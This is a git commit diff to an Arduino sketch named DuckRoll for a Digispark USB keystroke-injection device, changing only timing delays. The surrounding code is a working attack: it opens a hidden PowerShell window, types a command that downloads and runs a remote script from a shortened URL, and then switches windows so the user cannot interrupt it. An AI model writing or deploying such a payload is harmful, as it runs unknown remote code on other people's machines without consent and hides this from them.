7488f16a06bdd8fc48602a30f0d9f2fcf0d5d336
spaceface777 <spaceface7777@gmail.com>
2019-05-25 22:00:13 +0200

    Increase delays

--- DuckRoll/DuckRoll.ino
+++ DuckRoll/DuckRoll.ino
@@ -7,18 +7,19 @@ void setup() { // The code goes inside setup since it should only run once.
 
     // Init LED and wait for ducky to init
     pinMode(1, OUTPUT);
-    DigiKeyboard.delay(750);
+    DigiKeyboard.delay(1000);
 
     // Open a hidden Powershell window
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    DigiKeyboard.delay(150);
+    DigiKeyboard.delay(250);
     DigiKeyboard.println("powershell -W h"); // PowerShell.exe -WindowStyle Hidden
-    DigiKeyboard.delay(300);
+    DigiKeyboard.delay(1000);
 
     // Download and run the rest of the script
     DigiKeyboard.println("iex(iwr -useb bit.do/eSLgf)");
 
     // Alt-Tab away from the PS window (So people can't do Ctrl+C to stop it)
+    DigiKeyboard.delay(100);
     DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT);
 
     // All done, turn on LED so you know you can unplug it
